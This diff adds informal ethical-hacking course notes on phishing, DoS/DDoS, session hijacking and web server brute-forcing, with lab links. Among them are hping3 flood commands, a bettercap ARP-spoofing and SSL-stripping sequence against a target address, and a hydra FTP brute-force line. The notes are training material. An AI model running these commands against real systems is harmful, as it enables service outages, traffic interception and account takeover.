@@ -1,0 +1,157 @@
+Phsishing - Email as medium 
+Malware -njrat 
+
+Three Types 
+
+1. Email Phishing Scam - 
+2. Spear Phishing - Targeted - Org, Application .
+	->  Simplilearn 
+	->  Paypal 
+3. Whailing 
+	-> Bigfish 
+	-> CEO, CTO, CISO, Senior Managers. 
+	-> High Ranking Profiles 
+
+https://lms.vinciworks.com/review/CourseLaunch/Courseplayer.aspx?queryStringMain=9idBs03r6T8RTjYeCDLdZAAyLoyR1AQwc5X0PESPKvWxCi/o1oaH79ADIeN59Mmf
+
+https://phishingquiz.withgoogle.com/
+browseling
+
+Awarnesss 
+====================================================================
+
+DOS and DDOS 
+
+6 flags 
+SYN,ACK,RST, PSH, FIN,URG
+
+1. Bandwidth - Use the 2TB 
+2. Flood - Multiple request / Overload 
+3. land -- Same IP of 
+4. PDOS - Permenent DOS - 24hrs / 10,000
+CPU, Mem.
+
+SYN Flood 
+ACk Flood
+ICMP Flood - Ping of death
+
+hping -1 <target> --flood - ICMP Flood
+hping3 -S <target> --flood -- SYN Flood
+hping3 -R <target> --flood -- RST Flood
+
+https://www.wired.com/story/github-ddos-memcached/
+
+1. CDN - Content Delivery Network
+Cloudflare, AWS Cloudfront.
+2. Load Balancer - https://www.f5.com/glossary/load-balancer
+3. Web based 80,443, Geo Location
+4. Traffic  Monitoring - wireshark , NSM Colasoft capsa 
+5. Update the Systems  
+
+===========================================================
+Session Hajacking 
+
+Valid TCP Communication Session 
+HTTP Request 
+Identity Theft - Session ID 
+
+https://eccouncil.learnondemand.net/Lab/44229?instructionSetLang=en
+https://eccouncil.learnondemand.net/Lab/33229?instructionSetLang=en
+https://eccouncil.learnondemand.net/Lab/22229?instructionSetLang=en
+
+https://labclient.labondemand.com/LabClient/40ec70d7-c159-4b05-a48c-5366b255167f 
+
+Bettercap , Hetty
+
+Sudo su
+bettercap -h 
+ifconfig, ip route eth0,wlan0,en0
+> bettercap -iface wlan0
+> help 
+> net.probe.on ==> Send Te Packets to Each System in Network
+> net.recon on ==> Detect the Real time 
+> set http.proxy.sslstrip ture
+> set arp.spoof.internal true
+> set arp.spoof.targets 10.10.1.11 
+> http.proxy on
+> net.sniff on
+> arp.spoof on
+
+1. all the URL's 
+2. HTTP Session Request 
+
+
+-- Prevent from Session Hijacking 
+1. VPN 
+2. Use Personal Hotspot
+3. SIEM , SOC. ARP Packets , Promisious Mode 
+
+===============================================
+Hacking the WEb Server :- 
+
+
+Communication Process - Request and Response 
+IIS - Internet Inforamtion Services
+Apache 
+Tomcat 
+MySql, MsSql. Oracle , Mango 
+
+80,443
+HTTP, HTTPs
+
+SSH - 22
+Telnet - 23
+RDP - 3389 
+FTP - 21
+
+Cloud as Attacker 
+
+SSH Bruteforce
+Telnet Bruteforce 
+FTP bruteforce 
+RDP bruteforce 
+
+nmap -p 21,22,23,3389 <target>
+
+
+hydra  -L "Username.txt" -P "Password.txt" ftp://<Target>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
